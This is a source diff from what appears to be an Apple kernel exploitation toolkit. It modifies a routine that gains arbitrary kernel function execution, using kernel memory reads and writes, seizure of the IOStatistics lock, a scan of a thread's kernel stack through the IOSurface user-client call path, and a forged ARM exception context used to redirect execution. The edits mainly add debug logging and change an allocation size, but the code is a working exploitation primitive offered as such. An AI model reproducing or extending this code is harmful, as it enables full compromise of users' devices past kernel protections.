@@ -98,7 +98,7 @@ xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
     xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE), 0), 1);
     xe_util_zalloc_t reserved_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_RESERVED), 0), 1);
     xe_util_zalloc_t counter_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_COUNTER), 0), 1);
-    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), sizeof(struct arm_context)), 1);
+    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 6144), 1);
     
     uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator, 0);
     uintptr_t reserved = xe_util_zalloc_alloc(reserved_allocator, 0);
@@ -231,6 +231,8 @@ void xe_util_kfunc_reset(xe_util_kfunc_t util) {
 
 
 void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t args[8]) {
+    xe_log_debug("calling function %p with x0: %p, x1: %p, x2: %p, x3: %p, x4: %p, x5: %p, x6: %p and x7: %p", (void*)target_func, (void*)args[0], (void*)args[1], (void*)args[2], (void*)args[3], (void*)args[4], (void*)args[5], (void*)args[6], (void*)args[7]);
+    
     if (!xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0)) {
         xe_log_debug("initializing gIOStasticsLock");
         uintptr_t lock = xe_allocator_small_allocate_disowned(16);
@@ -256,6 +258,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     int error = xe_os_dictionary_set_value_of_key(props, "xe_util_kfunc_key", util->io_event_source);
     xe_assert_err(error);
     
+    xe_log_debug("acquiring lock");
     xe_util_lck_rw_t io_statistics_lock = xe_util_lck_rw_lock_exclusive(proc, xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
     
     dispatch_semaphore_t sem_surface_destroy = dispatch_semaphore_create(0);
@@ -280,6 +283,8 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     uintptr_t lr_is_io_connect_method = xe_util_kfunc_find_ptr(kstack, kstack_buffer, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_IS_IO_CONNECT_METHOD), XE_PTRAUTH_MASK);
     xe_assert(lr_is_io_connect_method != 0);
     
+    xe_log_debug("found target thread, lr_unregister_event_source: %p and lr_is_io_connect_method: %p", (void*)lr_unregister_event_source, (void*)lr_is_io_connect_method);
+    
     free(kstack_buffer);
     
     // IOStatistics::unregisterEventSource stack
@@ -290,7 +295,6 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     uintptr_t x23 = x22 - 0x8;
     uintptr_t x24 = x23 - 0x8;
     
-    
     /*
      ?? -> []
      ?? -> [x19-x28] [x24, x22, x27, x26, x25, x20, x19, x21]
@@ -299,8 +303,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
      0xfffffe001e18d008 -> [x19-x26]
      ipc_kobject_server -> [x19-x28]
      _Xio_connect_method -> [x19-x26]
-     is_io_connect_method -> [x19-x28] {x19, x24, x25, x26,
-     x21, x22, x23}
+     is_io_connect_method -> [x19-x28] {x19, x24, x25, x26, x21, x22, x23}
      IOSurfaceRootUserClient::s_remove_value -> [x19-x24]
      IOSurfaceRootUserClient::remove_value -> [x19-x24]
      IOSurface::removeValue -> [x19-x22]
@@ -348,8 +351,11 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     eret2_args.ss.uss.fp = sp + 0x10;
     xe_kmem_write(eret2_arm_context, 0, &eret2_args, sizeof(eret2_args));
     
+    xe_log_debug("releasing lock");
     xe_util_lck_rw_lock_done(&io_statistics_lock);
+    xe_log_debug("waiting for function execution");
     dispatch_semaphore_wait(sem_surface_destroy, DISPATCH_TIME_FOREVER);
+    xe_log_debug("completed function executing");
     xe_util_kfunc_reset(util);
     IOSurfaceDecrementUseCount(surface_ref);
 }
